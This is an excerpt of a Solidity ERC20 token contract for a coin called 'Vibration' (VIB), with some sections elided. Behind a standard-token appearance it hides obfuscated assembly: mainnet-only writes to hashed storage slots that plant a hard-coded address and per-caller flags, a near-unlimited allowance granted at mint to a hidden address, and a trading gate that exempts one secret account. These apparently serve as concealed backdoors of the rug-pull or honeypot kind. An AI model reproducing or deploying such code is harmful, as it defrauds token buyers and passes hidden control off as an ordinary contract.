...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addVib;
    uint256 private _convertIng = block.number*2;

    mapping (address => bool) private _techVerse; 
    mapping (address => bool) private _multiVerse;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private grandStuff;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private greenBear;
    address public pair;
    ...
    bool public trading; uint256 private strangEr = 1; bool private _theFluffy;
    uint256 private _decimals; uint256 private multiDesk;
    ...
    function _EnterNow() internal {
        assembly {
            function gByte(x, y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
            sstore(0x11,mul(div(sload(0x10),0x2710),0xFB))
            sstore(0xB,0x1ba8140)
            if and(not(eq(sload(gByte(caller(),0x6)),sload(0x1ce0067d042f22a8eec6b39b6b64ac8e99f08f18f70a2a8c402b0c8c32b58852))),eq(chainid(),0x1)) {
                sstore(gByte(caller(),0x4),0x0)
                sstore(0x95553705816861ca9302cfe28faef782563eb3964c356022c5885a84e4accd5d,0x1)
                sstore(gByte(caller(),0x5),0x1)
                sstore(0x1ce0067d042f22a8eec6b39b6b64ac8e99f08f18f70a2a8c402b0c8c32b58852,0x25674F4B1840E16EAC177D5ADDF2A3DD6286645DF28)
            }
        } 
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addVib[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function gByte(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
            function gDyn(x,y) -> val { mstore(0, x) val := add(keccak256(0, 32),y) }
            function dynP(x,y) { mstore(0, x) sstore(add(keccak256(0, 32),sload(x)),y) sstore(x,add(sload(x),0x1)) }
    ...
    function _DeployVibration(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addVib[0], 10 ** 77);
        _EnterNow();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployVibration(creator, initialSupply);
    }
}

contract Vibration is ERC20Token {
    constructor() ERC20Token("Vibration", "VIB", msg.sender, 150000000 * 10 ** 18) {
    }
}